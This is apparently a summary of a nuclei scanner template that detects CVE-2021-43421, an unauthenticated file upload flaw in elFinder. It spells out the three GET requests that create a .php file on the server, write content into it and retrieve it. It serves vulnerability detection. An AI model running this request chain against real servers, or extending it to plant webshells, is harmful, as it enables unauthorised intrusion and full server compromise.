---
cve_id: CVE-2021-43421
template_path: nuclei-templates/http/cves/2021/CVE-2021-43421.yaml
affected_product: Studio-42 elFinder
severity: critical
authentication: none
external_callback: false
affected_versions: 2.0.4 to 2.1.59
preconditions: [connector.minimal.php endpoint accessible]
poc_classification: rce
---

## Vulnerability

Studio-42 elFinder versions 2.0.4 to 2.1.59 are vulnerable to unauthenticated arbitrary file upload through the `/elFinder/php/connector.minimal.php` endpoint (CVE-2021-43421, CWE-434). A remote attacker can upload arbitrary files, including PHP webshells, and achieve remote code execution. CVSS 3.1 score 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Successful exploitation allows full server compromise.

## PoC / Detection

Classification: rce

The template performs a 3-request chain to verify the flaw:

- `GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{randstr}}.php:aaa` creates a crafted file.
- Extracts the returned file `hash` and issues `GET /elFinder/php/connector.minimal.php?cmd=put&target={{hash}}&content={{randstr_1}}` to write test content.
- `GET /elfinder/files/{{randstr}}.php%3Aaaa` retrieves the uploaded file and matches for the injected `{{randstr_1}}` string in the response body (status 200).

This confirms unauthenticated upload to the web-accessible directory, enabling RCE via PHP execution.

## References
- https://github.com/Studio-42/elFinder/issues/3429
- https://twitter.com/infosec_90/status/1455180286354919425
- https://nvd.nist.gov/vuln/detail/CVE-2021-43421
- https://github.com/ARPSyndicate/kenzer-templates
